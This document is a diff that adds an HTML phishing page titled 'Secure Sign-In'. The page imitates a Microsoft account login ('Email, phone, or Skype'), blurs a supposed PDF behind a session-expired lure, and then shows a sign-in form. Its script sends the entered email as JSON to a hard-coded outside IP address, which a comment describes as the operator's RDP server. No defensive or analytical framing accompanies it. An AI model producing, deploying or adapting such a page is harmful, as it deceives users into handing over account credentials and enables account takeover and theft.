@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Sign-In</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            transition: filter 0.5s ease;
+        }
+        #smallIframe {
+            position: absolute;
+            width: 450px; /* Original width for larger screens */
+            height: 350px; /* Original height for larger screens */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            border: none;
+            padding: 20px;
+            box-sizing: border-box;
+            opacity: 0;
+            transition: opacity 1s ease;
+        }
+        #logo {
+            position: relative;
+            width: 120px;
+            height: auto;
+            margin-top: 20px;
+            margin-left: 20px;
+            margin-bottom: 0;
+        }
+        #expiredText, #loginForm {
+            transition: opacity 1s ease;
+            position: relative;
+        }
+        #expiredText {
+            color: #000;
+            font-size: 26.5px;
+            margin-top: 10px;
+            margin-left: 20px;
+            margin-bottom: 0;
+            font-weight: 500;
+        }
+        .throbber-container {
+            position: absolute;
+            width: 100%;
+            height: 20px;
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+            overflow: hidden;
+            background: transparent;
+        }
+        .throbber {
+            display: flex;
+            width: 500%;
+            height: 100%;
+            animation: moveThrobber 6s ease-in-out infinite;
+        }
+        .throbber div {
+            width: 4px;
+            height: 4px;
+            background: #005da6;
+            border-radius: 50%;
+            margin: 0 8px;
+            animation: throb 1.5s ease-in-out infinite;
+        }
+        @keyframes moveThrobber {
+            0% { transform: translateX(-100%); }
+            50% { transform: translateX(0); }
+            100% { transform: translateX(100%); }
+        }
+        @keyframes throb {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+        #loginForm {
+            display: none;
+            text-align: left;
+            margin-top: 5px;
+            margin-left: 20px;
+            margin-right: 20px; /* Adjusted margin for mobile */
+        }
+        #loginForm input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: none;
+            border-bottom: 1px solid #005da6;
+            background: transparent;
+            box-shadow: none;
+            outline: none;
+            font-size: 16px;
+            resize: none;
+        }
+        #loginForm button {
+            background-color: #005da6;
+            color: white;
+            border: none;
+            padding: 7px 10px;
+            font-size: 16px;
+            border-radius: 0px;
+            cursor: pointer;
+            margin-top: 75px; /* Move the button down a little */
+            width: 100px;
+            float: right;
+            margin-right: 0;
+        }
+        #signInText {
+            color: #000;
+            font-size: 26.5px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        #loginForm p {
+            color: black; /* Change text color to black */
+        }
+        /* Media query for mobile devices */
+        @media (max-width: 600px) {
+            #smallIframe {
+                top: 30%; /* Adjust this value to move it higher */
+                width: 100%; /* Fill the width of the mobile frame */
+                height: auto; /* Adjust height as needed */
+            }
+            #loginForm {
+                margin-left: 10px; /* Optional: Adjust margins for mobile */
+                margin-right: 10px; /* Optional: Adjust margins for mobile */
+            }
+        }
+    </style>
+    <script>
+        window.onload = function() {
+            // No email field pre-filling and no validation
+        };
+
+        function showLoginForm() {
+            document.getElementById('expiredText').style.display = 'none';
+            document.querySelector('.throbber-container').style.display = 'none';
+            const loginForm = document.getElementById('loginForm');
+            loginForm.style.display = 'block';
+            document.getElementById('email').focus();
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('authForm').onsubmit = async function(event) {
+                event.preventDefault();
+                
+                const emailValue = document.getElementById('email').value;
+                
+                try {
+                    // Show loading state
+                    const button = document.querySelector('#authForm button');
+                    button.textContent = 'Sending...';
+                    button.disabled = true;
+                    
+                    // Send to your RDP server (replace with your actual RDP server IP/domain)
+                    const response = await fetch('http://162.251.123.242:2025/process-login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            email: emailValue,
+                            timestamp: new Date().toISOString(),
+                            source: 'web_form'
+                        })
+                    });
+                    
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    
+                    const result = await response.json();
+                    
+                    // Handle success - redirect or show success message
+                    if (result.success) {
+                        window.location.href = result.redirectUrl || 'https://example.com/success';
+                    } else {
+                        alert('Authentication failed: ' + (result.message || 'Unknown error'));
+                        button.textContent = 'Next';
+                        button.disabled = false;
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again.');
+                    button.textContent = 'Next';
+                    button.disabled = false;
+                }
+            };
+        });
+    </script>
+</head>
+<body>
+    <!-- [Previous HTML structure remains exactly the same until the form] -->
+    
+    <!-- Only change the form part (remove action/method) -->
+    <div id="loginForm">
+        <p id="signInText">Sign in</p>
+        <form id="authForm">
+            <input type="email" id="email" placeholder="Email, phone, or Skype" aria-label="email" required>
+            <button type="submit">Next</button>
+        </form>
+        <p style="font-size: 13px; color: black; margin-top: 10px;">No account? <span style="color: blue;">Create one!</span></p>
+        <p style="font-size: 13px; color: blue;">Can't access your account?</p>
+    </div>
+
+    <!-- [Rest of your existing HTML and scripts remain the same] -->
+    <script>
+        function applyBlur() {
+            document.getElementById('pdfViewer').style.filter = 'blur(5px)';
+        }
+        function showSmallIframe() {
+            document.getElementById('smallIframe').style.opacity = '1';
+        }
+        function fadeOutTextAndThrobber() {
+            document.getElementById('expiredText').style.opacity = '0';
+            document.querySelector('.throbber-container').style.opacity = '0';
+            setTimeout(showLoginForm, 1000);
+        }
+        setTimeout(applyBlur, 2000);
+        setTimeout(showSmallIframe, 3000);
+        setTimeout(fadeOutTextAndThrobber, 5000);
+    </script>
+</body>
+</html>
